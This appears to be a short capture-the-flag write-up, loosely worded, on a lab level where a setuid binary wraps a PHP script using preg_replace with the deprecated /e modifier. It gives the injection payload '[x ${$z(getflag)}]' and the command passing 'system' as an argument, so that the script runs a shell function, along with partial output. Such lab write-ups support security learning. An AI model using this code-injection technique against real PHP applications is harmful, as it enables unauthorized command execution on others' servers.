2 files level06 and level06.php
Execute level06 is the binary to level06.php
Level06.php take 2 arguments one in a file
We see that /e flag in preg_replac his deprecated because of the possibility to inject code php
Go inject it so. We put [x ${$z(getflag)}] because //2 will be ${$z(get flag)} (regex).
Then we need to put the function system in z.
For that we put this command: ./level06 /tmp/file "system" 
Then  [x ${$z(getflag)}]  will be ${$system(getflag)} and the output is:
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
